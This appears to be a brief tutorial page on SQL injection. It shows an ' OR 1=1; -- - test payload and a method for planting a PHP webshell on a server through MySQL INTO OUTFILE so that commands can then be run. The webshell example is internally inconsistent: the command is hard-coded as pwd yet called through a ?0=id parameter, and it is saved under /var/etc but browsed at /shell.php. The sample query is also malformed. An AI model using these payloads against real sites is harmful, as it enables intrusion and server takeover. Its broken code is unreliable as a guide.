# SQL Injection

This is one of the most common types of vulnerabilities that you can find on a web application. You don't need to use any tools for this, only an understanding of whatever type of database is on the backend. Examples here use MySQL, but the same principles apply to any query language.

## Testing For Vulnerabilities

You can check to see if an application is vulnerable to SQL injection using just about anything that takes user input, e.g. a login page or a search bar.

On the backend, an unsanitized query would look something like `SELECT address FROM users WHERE first_name='" + "John" "' AND last_name='" + "Deere" + "';"`.

You can check if queries are sanitized by submitting something like `' OR 1=1; -- -` into the search bar. In this example, you would get `address` from all users because the query would always produce a `true` result, thanks to `1=1`. `; -- -` terminates and comments out the rest of the query (the last `-` at the end is just to show there's a space after the other two).

Alternatively, attempting to tamper with the query could produce a syntax error on the screen, which tells you that you can directly interact with the database.

## Webshells

The following bit of PHP can let you establish a webshell with the server's machine.
`<?php system('<command>'); ?>`

You just have to use `into outfile` to save it into a .php file.

E.g. `SELECT 1, 2, 3, "<?php system('pwd'); ?>" INTO OUTFILE '/var/etc/shell.php';`
You could then browse to /shell.php?0=id to see the output.
